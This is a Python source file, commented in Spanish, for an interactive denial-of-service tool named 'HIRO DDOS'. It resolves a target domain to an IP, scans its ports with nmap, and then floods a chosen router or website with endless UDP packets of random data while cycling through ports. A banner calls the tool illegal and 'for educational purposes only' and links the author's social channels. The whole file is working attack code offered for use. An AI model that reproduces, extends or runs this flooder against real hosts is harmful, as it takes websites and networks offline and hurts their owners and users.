import os
import socket
import platform
import nmap

# Código de escape ANSI para el color rojo
RED = '\033[91m'
RESET = '\033[0m'

# Funciones para limpiar la pantalla y mostrar el banner
def clear_screen():
    os_system = platform.system()
    if os_system == "Windows":
        os.system("cls")
    else:
        os.system("clear")

def display_banner():
    os_system = platform.system()
    banner_title = """
 ██░ ██  ██▓ ██▀███   ▒█████        ▓█████▄ ▓█████▄  ▒█████    ██████ 
▓██░ ██▒▓██▒▓██ ▒ ██▒▒██▒  ██▒      ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
▒██▀▀██░▒██▒▓██ ░▄█ ▒▒██░  ██▒      ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
░▓█ ░██ ░██░▒██▀▀█▄  ▒██   ██░      ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
░▓█▒░██▓░██░░██▓ ▒██▒░ ████▓▒░      ░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
 ▒ ░░▒░▒░▓  ░ ▒▓ ░▒▓░░ ▒░▒░▒░        ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
 ▒ ░▒░ ░ ▒ ░  ░▒ ░ ▒░  ░ ▒ ▒░        ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
 ░  ░░ ░ ▒ ░  ░░   ░ ░ ░ ░ ▒         ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
 ░  ░  ░ ░     ░         ░ ░           ░       ░        ░ ░        ░  
                                     ░       ░                                                                                
"""
    border = "▄" * 70
    padding = " " * ((40 - len(banner_title.split('\n')[0])) // 2) 

    print(f"\n{RED}{border}{RESET}")
    print(f"{RED}{padding}{banner_title}{RESET}")
    print(f"{RED}{border}{RESET}")
    print()
    print(f"{RED}Coded By    : Bons18{RESET}")
    print(f"{RED}Github      : github.com/Bons18{RESET}")
    print(f"{RED}Fb Page     : facebook.com/Bons18{RESET}")
    print(f"{RED}FB Group    : facebook.com/groups/Bons18{RESET}")
    print(f"{RED}Telegram    : t.me/Crackerspace{RESET}")
    print(f"{RED}Note        : This Tool Is Illegal & For Educational Purposes Only.{RESET}")
    print(f"{RED}              Use It At Your Own Risk. We'll Not Be Responsible For Any Issues.{RESET}")
    print()

# Función para obtener la IP de un dominio usando socket.gethostbyname()
def get_ip_from_domain(domain):
    try:
        ip = socket.gethostbyname(domain)
        print(f"\n{RED}Domain: {domain}{RESET}")
        print(f"{RED}Extracted IP: {ip}{RESET}")
        return ip
    except socket.gaierror:
        print(f"{RED}Error: Unable to resolve domain {domain}. Please check the domain and try again.{RESET}")
        return None

# Función para validar IP
def validate_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

# Función para escanear puertos usando nmap
def scan_ports_with_nmap(ip):
    nm = nmap.PortScanner()
    print(f"\n{RED}Scanning open ports on {ip}...{RESET}")

    # Ejecutar escaneo de puertos del 1 al 1024
    nm.scan(ip, '1-1024', '-sS')

    # Almacenar los puertos abiertos
    open_ports = []
    for proto in nm[ip].all_protocols():
        lport = nm[ip][proto].keys()
        for port in lport:
            if nm[ip][proto][port]['state'] == 'open':
                open_ports.append(port)

    if open_ports:
        print(f"\n{RED}Open ports on {ip}: {open_ports}{RESET}")
    else:
        print(f"\n{RED}No open ports found on {ip} in range 1-1024.{RESET}")
    
    return open_ports

# Función para ataque DDoS a página web
def attack_website(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = os.urandom(1024)  # Datos más pequeños para HTTP
    sent = 0
    try:
        while True:
            sock.sendto(data, (ip, port))
            sent += 1
            port += 1
            if port == 65534:
                port = 1
            print(f"\r{RED}Sent {sent} packets to {ip} through port {port}{RESET}", end="")
    except KeyboardInterrupt:
        print(f"\n{RED}Attack interrupted by user.{RESET}")
    except Exception as e:
        print(f"\n{RED}An error occurred: {e}{RESET}")
    finally:
        sock.close()

# Menú para seleccionar el tipo de ataque
def select_attack_type():
    clear_screen()
    display_banner()

    print(f"{RED}Select Attack Type:{RESET}\n")
    print(f"{RED}1. router{RESET}")
    print(f"{RED}2. website{RESET}")
    attack_type = input(f"\n{RED}Choose an option (1/2): {RESET}").strip()

    if attack_type == "1":
        ip = input(f"{RED}Enter Router IP    : {RESET}")
        port = int(input(f"{RED}Enter Router Port  : {RESET}"))
        clear_screen()
        print(f"{RED}Starting Attack on Router IP {ip} through port {port}...{RESET}")
        attack_router(ip, port)

    elif attack_type == "2":
        website_attack_menu()

    else:
        print(f"{RED}Invalid option. Please choose 1 or 2.{RESET}")
        select_attack_type()

# Menú de ataque a un sitio web con opción de extracción de IP
def website_attack_menu():
    clear_screen()
    display_banner()

    print(f"{RED}Website Attack Options:{RESET}\n")
    print(f"{RED}1. Extract IP from domain{RESET}")
    print(f"{RED}2. Enter Website IP manually{RESET}")
    print(f"{RED}3. Back to main menu{RESET}")

    option = input(f"\n{RED}Choose an option (1/2/3): {RESET}").strip()

    if option == "1":
        domain = input(f"\n{RED}Enter Website Domain: {RESET}").strip()
        ip = get_ip_from_domain(domain)
        if ip:
            next_step = input(f"\n{RED}Do you want to use this IP for the attack? (y/n): {RESET}").strip().lower()
            if next_step == "y":
                port_scan_option(ip)
            else:
                website_attack_menu()

    elif option == "2":
        ip = input(f"\n{RED}Enter Website IP: {RESET}").strip()
        if validate_ip(ip):
            port_scan_option(ip)
        else:
            print(f"{RED}Invalid IP address. Please try again.{RESET}")
            website_attack_menu()

    elif option == "3":
        select_attack_type()

    else:
        print(f"{RED}Invalid option. Please choose 1, 2, or 3.{RESET}")
        website_attack_menu()

# Función para escanear puertos o ingresar manualmente
def port_scan_option(ip):
    print(f"\n{RED}Do you want to scan for open ports?{RESET}")
    print(f"{RED}1. Yes, scan ports (1-1024){RESET}")
    print(f"{RED}2. No, enter port manually{RESET}")
    print(f"{RED}3. Back to previous menu{RESET}")

    option = input(f"\n{RED}Choose an option (1/2/3): {RESET}").strip()

    if option == "1":
        open_ports = scan_ports_with_nmap(ip)
        if open_ports:
            selected_port = int(input(f"\n{RED}Select a port from the open ports {open_ports}: {RESET}"))
            attack_website(ip, selected_port)
        else:
            print(f"\n{RED}No open ports found. Try entering a port manually.{RESET}")
            port = int(input(f"\n{RED}Enter Website Port: {RESET}"))
            attack_website(ip, port)

    elif option == "2":
        port = int(input(f"\n{RED}Enter Website Port: {RESET}"))
        attack_website(ip, port)

    elif option == "3":
        website_attack_menu()

    else:
        print(f"{RED}Invalid option. Please choose 1, 2, or 3.{RESET}")
        port_scan_option(ip)

# Función para ataque DDoS a router
def attack_router(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = os.urandom(65500)
    sent = 0
    try:
        while True:
            sock.sendto(data, (ip, port))
            sent += 1
            port += 1
            if port == 65534:
                port = 1
            print(f"\r{RED}Sent {sent} packets to {ip} through port {port}{RESET}", end="")
    except KeyboardInterrupt:
        print(f"\n{RED}Attack interrupted by user.{RESET}")
    except Exception as e:
        print(f"\n{RED}An error occurred: {e}{RESET}")
    finally:
        sock.close()

# Ejecutar el menú principal
select_attack_type()
